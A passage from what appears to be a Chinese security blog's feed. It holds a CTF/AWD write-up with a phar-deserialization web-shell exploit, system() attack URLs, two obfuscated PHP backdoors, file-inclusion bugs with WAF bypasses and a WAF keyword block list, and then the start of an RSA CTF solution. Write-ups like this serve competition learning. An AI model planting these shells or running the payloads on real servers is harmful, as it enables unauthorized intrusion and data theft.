class="string">'filename'</span>]))&#123;</span><br><span class="line">$filename=$_GET[<span class="string">'filename'</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">'echo "hahaha";'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($filename);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是前段时间black hat上提到的利用phar伪协议在一些文件系统函数中触发反序列化漏洞。</p><p>phar文件本质上是一个压缩文件，在manifest部分存放每个被压缩文件的权限、属性等信息和用户自定义的meta-data数据，后者是以序列化后的形式存在的。而PHP中大部分文件系统函数在通过 <code>phar://</code> 伪协议解析phar文件时，都会将meta-data反序列化。因此就有了本题的反序列化触发点file_exists函数。除了file_exists还有下图所示的函数，详见 <a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">利用 phar 拓展 php 反序列化漏洞攻击面</a> 。</p><p><img src="17c4c630-b5f7-4e02-af48-160cd8fcf73a.png-w331s" alt="img"></p><p>所以本题的思路是先生成一个meta-data中包含恶意object的phar文件，然后通过上传点上传该文件得到路径，再在 <code>file_aq12ws.php</code> 通过filename参数以<code>phar://</code> 方式包含该文件，就将在file_exists函数处触发phar文件的meta-data的反序列化，就可以得到一个web shell。</p><p>要生成phar文件，需要 phar.readonly 为Off，即值为0。而出于安全性考虑，该项默认使能，值为1。当php.ini文件中的phar.readonly值为0时，可以使用ini_set在脚本中设为1或0；当值为1时，只能通过修改php.ini文件来修改值而不能通过脚本修改。也就是说，我们需要在生成phar文件前修改php.ini中phar.readonly值的Off。详细说明见 <a href="http://php.net/manual/en/phar.configuration.php#ini.phar.readonly" target="_blank" rel="noopener">文档</a> 。</p><p>生成phar包的代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">'@eval($_GET["cmd"]);'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    $evil_object=<span class="keyword">new</span> MyClass();<span class="comment">//生成恶意对象</span></span><br><span class="line"></span><br><span class="line">    $file_name=<span class="string">"test.phar"</span>;<span class="comment">//后缀必须为phar</span></span><br><span class="line">    <span class="keyword">if</span>(file_exists($file_name))unlink(<span class="string">'test.phar'</span>);<span class="comment">//删除当前目录下已有的phar包</span></span><br><span class="line">    $phar=<span class="keyword">new</span> Phar($file_name);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);<span class="comment">//设置stub，可理解为phar文件的标志</span></span><br><span class="line">    $phar-&gt;setMetadata($evil_object);<span class="comment">//将恶意对象作为自定义的meta-data传入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"foo.txt"</span>,<span class="string">"bar"</span>);<span class="comment">//添加压缩文件及其内容</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>访问该代码后目录下会生成<code>test.phar</code> 文件，重命名为<code>test.gif</code> ，上传后访问 <code>target.ip/file_aq12ws.php?filename=phar://test.gif&amp;cmd=phpinfo();</code> 见到phpinfo页面就说明成功了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ xxd test.phar</span><br><span class="line">00000000: 3c3f 7068 7020 5f5f 4841 4c54 5f43 4f4d  &lt;?php __HALT_COM</span><br><span class="line">00000010: 5049 4c45 5228 293b 203f 3e0d 0a70 0000  PILER(); ?&gt;..p..</span><br><span class="line">00000020: 0001 0000 0011 0000 0001 0000 0000 003b  ...............;</span><br><span class="line">00000030: 0000 004f 3a37 3a22 4d79 436c 6173 7322  ...O:7:<span class="string">"MyClass"</span></span><br><span class="line">00000040: 3a31 3a7b 733a 363a 226f 7574 7075 7422  :1:&#123;s:6:<span class="string">"output"</span></span><br><span class="line">00000050: 3b73 3a32 303a 2240 6576 616c 2824 5f47  ;s:20:<span class="string">"@eval(<span class="variable">$_G</span></span></span><br><span class="line"><span class="string">00000060: 4554 5b22 636d 6422 5d29 3b22 3b7d 0700  ET["</span>cmd<span class="string">"]);"</span>;&#125;..</span><br><span class="line">00000070: 0000 666f 6f2e 7478 7403 0000 000a 5ffb  ..foo.txt....._.</span><br><span class="line">00000080: 5b03 0000 00aa 8cff 76b6 0100 0000 0000  [.......v.......</span><br><span class="line">00000090: 0062 6172 7533 2162 c819 a6d5 6019 ab22  .baru3!b....`..<span class="string">"</span></span><br><span class="line"><span class="string">000000a0: 7e2e f1df 96d7 b375 0200 0000 4742 4d42  ~......u....GBMB</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//172.16.17.2/file_aq12ws.php?filename=phar://upload_file/phphphar2.gif&amp;a=system('find / | grep flag');</span></span><br><span class="line">http:<span class="comment">//172.16.17.2/file_aq12ws.php?filename=phar://upload_file/phphphar2.gif&amp;a=system('cat /var/www/html/sdf3r_df3erdf/flag.txt');</span></span><br><span class="line">flag&#123;qwe3_89fdsf3_jjnj3ioxc_ozxov&#125;</span><br></pre></td></tr></table></figure><h1 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><p><strong>attack</strong> </p><p>一上来D盾扫出几个后门。用其中一个连了菜刀，在<code>E:\wwwroot\RequestFlag\</code> 发现<code>url.bat</code> ，内容为：<code>curl.exe https://FlagServer.com:9000/flag --cacert ca.crt --cert client.crt --key client.key</code> ，在目标机上执行该命令可以得到对方flag。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">"http://172.16.18.13/wordpress/wp-includes/customize/class-wp-customize-background-image-list.php"</span> -d <span class="string">"-7=system('E:\wwwroot\RequestFlag\curl.exe https://FlagServer.com:9000/flag --cacert E:\wwwroot\RequestFlag\ca.crt --cert E:\wwwroot\RequestFlag\client.crt --key E:\wwwroot\RequestFlag\client.key');"</span></span><br></pre></td></tr></table></figure><p>用的木马是<code>wwwroot\wordpress\wp-includes\customize\class-wp-customize-background-image-list.php</code>  ，相当于<code>@assert(${_POST}[-7]);</code> 。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$_ = <span class="string">"s"</span> . <span class="string">"s"</span> . <span class="comment">/*-/*-*/</span><span class="string">"e"</span> . <span class="comment">/*-/*-*/</span><span class="string">"r"</span>;</span><br><span class="line">@$_ = <span class="comment">/*-/*-*/</span><span class="string">"a"</span> . <span class="comment">/*-/*-*/</span>$_ . <span class="comment">/*-/*-*/</span><span class="string">"t"</span>;</span><br><span class="line">@$_<span class="comment">/*-/*-*/</span>($<span class="comment">/*-/*-*/</span>&#123;<span class="string">"_P"</span> . <span class="comment">/*-/*-*/</span><span class="string">"OS"</span> . <span class="comment">/*-/*-*/</span><span class="string">"T"</span>&#125;</span><br><span class="line">[<span class="comment">/*-/*-*/</span><span class="number">0</span><span class="comment">/*-/*-*/</span> - <span class="comment">/*-/*-*/</span><span class="number">2</span><span class="comment">/*-/*-*/</span> - <span class="comment">/*-/*-*/</span><span class="number">5</span><span class="comment">/*-/*-*/</span>]);</span><br></pre></td></tr></table></figure><p>在WAF上配了一些敏感字符正则后观察日志，发现另一个大家用的比较多的后门，<code>wwwroot\wordpress\wp-includes\pomo\tp.php</code> ，等价于<code>@ASsERT(eval(@$_POST[cmd]));</code> 。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$&#123;(<span class="string">"#"</span> ^ <span class="string">"|"</span>) . (<span class="string">"#"</span> ^ <span class="string">"|"</span>)&#125; = (<span class="string">"!"</span> ^ <span class="string">"`"</span>) . (<span class="string">"( "</span> ^ <span class="string">"&#123;"</span>) . (<span class="string">"("</span> ^ <span class="string">"["</span>) . (<span class="string">"~"</span> ^ <span class="string">";"</span>) . (<span class="string">"|"</span> ^ <span class="string">"."</span>) . (<span class="string">"*"</span> ^ <span class="string">"~"</span>);</span><br><span class="line">@$&#123;(<span class="string">"#"</span> ^ <span class="string">"|"</span>) . (<span class="string">"#"</span> ^ <span class="string">"|"</span>)&#125;((<span class="string">"-"</span> ^ <span class="string">"H"</span>) . (<span class="string">"]"</span> ^ <span class="string">"+"</span>) . (<span class="string">"["</span> ^ <span class="string">":"</span>) . (<span class="string">","</span> ^ <span class="string">"@"</span>) . (<span class="string">"&#125;"</span> ^ <span class="string">"U"</span>) . (<span class="string">"~"</span> ^ <span class="string">"&gt;"</span>) . (<span class="string">"e"</span> ^ <span class="string">"A"</span>) . (<span class="string">"("</span> ^ <span class="string">"w"</span>) . (<span class="string">"j"</span> ^ <span class="string">":"</span>) . (<span class="string">"i"</span> ^ <span class="string">"&amp;"</span>) . (<span class="string">"#"</span> ^ <span class="string">"p"</span>) . (<span class="string">"&gt;"</span> ^ <span class="string">"j"</span>) . (<span class="string">"!"</span> ^ <span class="string">"z"</span>) . (<span class="string">"]"</span> ^ <span class="string">"&gt;"</span>) . (<span class="string">"@"</span> ^ <span class="string">"-"</span>) . (<span class="string">"["</span> ^ <span class="string">"?"</span>) . (<span class="string">"?"</span> ^ <span class="string">"b"</span>) . (<span class="string">"]"</span> ^ <span class="string">"t"</span>));</span><br></pre></td></tr></table></figure><p>后来发现两处文件包含。可以利用<code>./</code> 和<code>../</code> 分隔关键字绕过WAF，因为醒悟的比较晚和自动化做得不够方便，这个没有发挥太大作用。</p><p><code>wwwroot\wordpress\wp-content\plugins\localize-my-post\ajax\include.php</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Include WP base to have the basic WP functions</span></span><br><span class="line"><span class="keyword">include_once</span>($_SERVER[<span class="string">'DOCUMENT_ROOT'</span>] . <span class="string">"/wp-blog-header.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Set status 200 header</span></span><br><span class="line"><span class="comment">//Include requested file if it exists</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'file'</span>]))&#123;</span><br><span class="line">$file=$_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">$file = str_replace(<span class="string">'./'</span>,<span class="string">''</span>,$file);</span><br><span class="line">header(<span class="string">'HTTP/1.1 200 OK'</span>);</span><br><span class="line"><span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和 <code>wwwroot\wordpress\wp-content\plugins\site-editor\editor\extensions\pagebuilder\includes\ajax_shortcode_pattern.php</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[<span class="string">'ajax_path'</span>] ) )&#123;</span><br><span class="line">$ajax_path=$_REQUEST[<span class="string">'ajax_path'</span>];</span><br><span class="line">$ajax_path = str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$ajax_path);</span><br><span class="line">    <span class="keyword">require_once</span> $ajax_path;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>此外，有些队伍过滤了system，exe等关键字，采用反引号，base64编码，rot13编码等尝试绕过。</p><p>也许因为check机制不好使，某个时间开始大约一半以上的队伍选择关站保平安，即使只是访问对方主页也会被WAF拦截。这不难实现，只要在WAF里面把IP当关键字过滤掉就可以。这大概不太厚道吧，但黑客嘛，也许就是理解并打击规则？</p><p>没挖出啥洞，我好菜啊。而且WAF这么强，挖出来也用不上吧。</p><p><strong>defense</strong> </p><p>一开始就在WAF上把D盾扫出来的几个可疑文件加入黑名单，后来又配了敏感关键字<code>exec|system|exe|curl|flag|base64|filter|cmd|-7|{|rot13</code> 等，所以Web基本只在刚开始的几轮失分。</p><p>全程就是每轮打一下，看看WAF有没拦到有趣的东西，挣扎着试图挖到洞，以及尝试一些绕过关键字的方法。</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p><strong>attack</strong> </p><p>因为Web手比较菜:(，PWN手帮忙看了半天Web，开始搞PWN的时间比较晚，心态有点崩，最后思路来得晚，全程没打出分，很可惜。也许后面研究下王博的WP再复现一下。</p><p><strong>defense</strong> </p><p>权限问题动不了PWN文件，patch无门，基本坐着挨打。同样可能因为check机制的问题，存在一个fork炸弹躺下装死的防御思路。</p><h1 id="挨打要立正"><a href="#挨打要立正" class="headerlink" title="挨打要立正"></a>挨打要立正</h1><p>拿到两个第二确实是赛前没想到的，但这改变不了我菜的本质。队友们虽然比我强，但是也依然有很大进步空间，包括更扎实的基础，更熟练的操作，更灵活的思路，更默契的配合等等。</p><p>第一天突围赛刚开始比较顺利，最后五分钟被夜影师傅所在队伍反超，放上他们的逆向writeup：<a href="https://blog.csdn.net/whklhhhh/article/details/84454534" target="_blank" rel="noopener">181124 逆向-2018“柏鹭杯”厦大邀请赛初赛（Re1、2）</a> ，以弥补本文不足。</p><p>第二天AWD则全程被北航吊打，伏地膜。</p><p><del>因为看到某群里有人吐槽这是垃圾比赛，我觉得这个说法不太负责任，所以作为厦大学生多说两句。从题目来说。crypto一题有点脑洞，一题简单，一题中等，可以接受，misc也是相对合格的，Web题思路清晰，也有有趣的东西。reverse，PWN中也不乏质量不错的题，做出题的师傅也是认可其有自己特点的。</del></p><p><del>除了题目，比赛奖金也是很高的，闭幕式到场的嘉宾也是够级别的，比赛环境可以说相当不错，住宿交通也很人性化。从各个角度来说，这都可以算是一场有诚意的，有愿望办好且确实做得不错的比赛。所以不管是因为没被邀请、做不出题、确实感觉题目质量不行、现场厕所不够用、志愿者里面漂亮小姐姐不够多还是其他什么原因而觉得不爽的，吐槽时把话说清楚还是比较好的，免得引起不必要的误解。明年应该还会举办，欢迎路过的大佬来玩。</del></p><p><del>当然，要改进的东西还是蛮多的，反思不应该由我来做，简单说点自己的感受。最不理想的大概是AWD的check，这个称为健康检查的东西好像分不清怎样是健康。其次是使用WAF作为Web防守的工具固然可以让即使是像我这样的AWD经验不足的选手都可以很舒服，也减轻维护压力，但这样是没法打出刺激的AWD的，再加上check和我一样菜，除了没搞清楚状况的选手，有坚定原则的选手，很可能出现全场全线WAF，那就没啥好打的了。最后是PWN没有给选手patch的权限，这是不太正常的，直接导致最好的防护是把自己搞down，不管主办方是出于维护难度考虑还是什么，对真正有能力且想打一场有意思的比赛的选手来说游戏体验是不太好的。所以如果揪住这几点发表比较严厉的批评的话我是没话说的😔</del></p><p>最后，感谢队友带飞。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CTF&quot;&gt;&lt;a href=&quot;#CTF&quot; class=&quot;headerlink&quot; title=&quot;CTF&quot;&gt;&lt;/a&gt;CTF&lt;/h1&gt;&lt;h2 id=&quot;Crypto&quot;&gt;&lt;a href=&quot;#Crypto&quot; class=&quot;headerlink&quot; title=&quot;Crypto&quot;&gt;&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>如果RSA加密中的e和phi不互质</title>
    <link href="https://findneo.github.io/181124-what-if-e-phi-not-coprime/"/>
    <id>https://findneo.github.io/181124-what-if-e-phi-not-coprime/</id>
    <published>2018-11-24T12:30:39.000Z</published>
    <updated>2019-01-25T23:21:37.215Z</updated>
    
    <content type="html"><![CDATA[<p>这是和别人家的学弟交流的一道题，据称是2018高校网络信息安全管理运维挑战赛的RSA题目，可以帮助理解在RSA加密（姑且还这样称呼它吧）中当加密指数e和欧拉函数phi不互质的时候意味着什么，以及可能的解决方案。</p><p>如果没有理解错误的话，不互质并不会导致加密不安全，只是无法解密了，而且明文和密文在模数范围内也不再是一一对应。</p><p>此时如果有多个加密过程，他们的明文m和加密指数e相等，n不相等，那么只要能够构建一定数量的同余式，就可以用中国剩余定理求解，类似于广播攻击。</p><p>另一种思路就是本题的情况。多个同余式中的若干个n是可分解的，那么排列组合他们的p，q，以使得某种组合的phi能够和e互质，然后可以把模数降到这种组合的n值，就可以解出明文了。当然，这题的情况大概不是常有的。</p><p>题目内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">n1=<span class="number">0xcfc59d54b4b2e9ab1b5d90920ae88f430d39fee60d18dddbc623d15aae645e4e50db1c07a02d472b2eebb075a547618e1154a15b1657fbf66ed7e714d23ac70bdfba4c809bbb1e27687163cb09258a07ab2533568192e29a3b8e31a5de886050b28b3ed58e81952487714dd7ae012708db30eaf007620cdeb34f150836a4b723L</span></span><br><span class="line">e1=<span class="number">0xfae3aL</span></span><br><span class="line">c1=<span class="number">0x81523a330fb15125b6184e4461dadac7601340960840c5213b67a788c84aecfcdc3caf0bf3e27e4c95bb3c154db7055376981972b1565c22c100c47f3fa1dd2994e56090067b4e66f1c3905f9f780145cdf8d0fea88a45bae5113da37c8879c9cdb8ee9a55892bac3bae11fbbabcba0626163d0e2e12c04d99f4eeba5071cbeaL</span></span><br><span class="line">n2=<span class="number">0xd45304b186dc82e40bd387afc831c32a4c7ba514a64ae051b62f483f27951065a6a04a030d285bdc1cb457b24c2f8701f574094d46d8de37b5a6d55356d1d368b89e16fa71b6603bd037c7f329a3096ce903937bb0c4f112a678c88fd5d84016f745b8281aea8fd5bcc28b68c293e4ef4a62a62e478a8b6cd46f3da73fa34c63L</span></span><br><span class="line">e2=<span class="number">0x1f9eaeL</span></span><br><span class="line">c2=<span class="number">0x4d7ceaadf5e662ab2e0149a8d18a4777b4cd4a7712ab825cf913206c325e6abb88954ebc37b2bda19aed16c5938ac43f43966e96a86913129e38c853ecd4ebc89e806f823ffb802e3ddef0ac6c5ba078d3983393a91cd7a1b59660d47d2045c03ff529c341f3ed994235a68c57f8195f75d61fc8cac37e936d9a6b75c4bd2347L</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> pow(flag,e1,n1)==c1</span><br><span class="line"><span class="keyword">assert</span> pow(flag,e2,n2)==c2</span><br><span class="line"><span class="keyword">assert</span> gcd(e1,(p1<span class="number">-1</span>)*(q1<span class="number">-1</span>))==<span class="number">14</span></span><br><span class="line"><span class="keyword">assert</span> gcd(e2,(p2<span class="number">-1</span>)*(q2<span class="number">-1</span>))==<span class="number">14</span></span><br></pre></td></tr></table></figure><p>解答代码如下，为了给学弟看，做了具体的注释。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding : utf-8 -*-</span></span><br><span class="line"><span class="comment"># python 3.7</span></span><br><span class="line"><span class="comment"># __author__ = 'https://github.com/findneo'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factordb</span><span class="params">(n)</span>:</span></span><br><span class="line">    api=<span class="string">"http://factordb.com/api.php"</span></span><br><span class="line">    r=requests.get(api,params=&#123;<span class="string">'query'</span>:n&#125;)</span><br><span class="line">    res=json.loads(r.content)</span><br><span class="line">    <span class="keyword">if</span> res[<span class="string">'status'</span>] == <span class="string">"FF"</span>:</span><br><span class="line">        p,q=res[<span class="string">'factors'</span>][<span class="number">0</span>][<span class="number">0</span>],res[<span class="string">'factors'</span>][<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">        [p,q]=map(int,[p,q])</span><br><span class="line">        <span class="comment"># print('\n'.join([hex(p),hex(q)]))</span></span><br><span class="line">        <span class="keyword">return</span> p,q</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"not fully factored!"</span>)</span><br><span class="line"></span><br><span class="line">n1=<span class="number">0xcfc59d54b4b2e9ab1b5d90920ae88f430d39fee60d18dddbc623d15aae645e4e50db1c07a02d472b2eebb075a547618e1154a15b1657fbf66ed7e714d23ac70bdfba4c809bbb1e27687163cb09258a07ab2533568192e29a3b8e31a5de886050b28b3ed58e81952487714dd7ae012708db30eaf007620cdeb34f150836a4b723</span></span><br><span class="line">e1=<span class="number">0xfae3a</span></span><br><span class="line">c1=<span class="number">0x81523a330fb15125b6184e4461dadac7601340960840c5213b67a788c84aecfcdc3caf0bf3e27e4c95bb3c154db7055376981972b1565c22c100c47f3fa1dd2994e56090067b4e66f1c3905f9f780145cdf8d0fea88a45bae5113da37c8879c9cdb8ee9a55892bac3bae11fbbabcba0626163d0e2e12c04d99f4eeba5071cbea</span></span><br><span class="line">p1,q1=factordb(n1)</span><br><span class="line"><span class="comment"># p1=0xe5d7acdf77ca09e4391f21cea16c01cd2302d1a1df3983d413e9ee91fce8d9184ec0d0ca1608dbed748ed905a2beddc00168a1245f27f67e1240073c3d097965</span></span><br><span class="line"><span class="comment"># q1=0xe76aed4830504369c7c12070490f18900b80da1035ef82991dd35c52fd51731025c4498e8998bd026b9898963b6b69ded47b1dd96c264eac9d875756fd1b29e7</span></span><br><span class="line"></span><br><span class="line">n2=<span class="number">0xd45304b186dc82e40bd387afc831c32a4c7ba514a64ae051b62f483f27951065a6a04a030d285bdc1cb457b24c2f8701f574094d46d8de37b5a6d55356d1d368b89e16fa71b6603bd037c7f329a3096ce903937bb0c4f112a678c88fd5d84016f745b8281aea8fd5bcc28b68c293e4ef4a62a62e478a8b6cd46f3da73fa34c63</span></span><br><span class="line">e2=<span class="number">0x1f9eae</span></span><br><span class="line">c2=<span class="number">0x4d7ceaadf5e662ab2e0149a8d18a4777b4cd4a7712ab825cf913206c325e6abb88954ebc37b2bda19aed16c5938ac43f43966e96a86913129e38c853ecd4ebc89e806f823ffb802e3ddef0ac6c5ba078d3983393a91cd7a1b59660d47d2045c03ff529c341f3ed994235a68c57f8195f75d61fc8cac37e936d9a6b75c4bd2347</span></span><br><span class="line">p2,q2=factordb(n2)[::<span class="number">-1</span>]</span><br><span class="line"><span class="comment"># p2=0xeae0dfb99949af5175c425e22ec3c2e5b73cec0b70510dcc0ccd368ca6e868146c8783fa4aee0548fc725a3c3b0e46e44ec60357d3e6f4a5207e8a8ddf9c1225</span></span><br><span class="line"><span class="comment"># q2=0xe76aed4830504369c7c12070490f18900b80da1035ef82991dd35c52fd51731025c4498e8998bd026b9898963b6b69ded47b1dd96c264eac9d875756fd1b29e7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(q1==q2)</span><br><span class="line">q=q1</span><br><span class="line"><span class="comment"># n1,n2均可分解，且有一个公因数</span></span><br><span class="line"><span class="comment"># 由于gcd(e,phi)==14，将 (flag**e)%n = c 看作 (((flag**14)%n) ** (e//14) ) % n == c</span></span><br><span class="line"><span class="comment"># 分别记 e//14为e1,e2 , (flag**14)%n1 为 f1 , (flag**14)%n2 为 f2,则 pow(f1,e1,n1)==c1,pow(f2,e2,n2)==c2 且 gcd(e1,phi1)==gcd(e2,phi2)==1。可求得 f1,f2</span></span><br><span class="line">e1=e1//<span class="number">14</span>;e2=e2//<span class="number">14</span></span><br><span class="line">phi1=(p1<span class="number">-1</span>)*(q1<span class="number">-1</span>);phi2=(p2<span class="number">-1</span>)*(q2<span class="number">-1</span>)</span><br><span class="line">d1=gmpy2.invert(e1,phi1);d2=gmpy2.invert(e2,phi2)</span><br><span class="line">f1=pow(c1,d1,n1);f2=pow(c2,d2,n2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 记 flag**14 为 f3,则有同余方程组 f3 % n1 == f1; f3 % n2 == f2。其中f1,f2,n1,n2已知，可求模lcm(n1,n2)意义下的解 f3。</span></span><br><span class="line"><span class="comment"># 参考 https://findneo.github.io/180727rsa-attack/#%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86。</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="comment"># mi,ai分别表示模数和取模后的值,都为列表结构</span></span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gmpy2.gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>) <span class="comment">#不成立则不存在解</span></span><br><span class="line">        K = c // d * gmpy2.invert(curm // d, m // d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m // d</span><br><span class="line">        cura %= curm</span><br><span class="line">    <span class="keyword">return</span> (cura % curm, curm) <span class="comment">#(解,最小公倍数)</span></span><br><span class="line">f3,lcm = GCRT([n1,n2],[f1,f2])</span><br><span class="line"><span class="keyword">assert</span>(f3%n1==f1);<span class="keyword">assert</span>(f3%n2==f2);<span class="keyword">assert</span>(lcm==p1*p2*q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># assert(flag**14 % lcm == f3)</span></span><br><span class="line"><span class="comment"># 此时求出的 f3 满足上式。其中 lcm==p1*p2*q 有5个约数: 1, p1*q即n1 ,p2*q即n2, 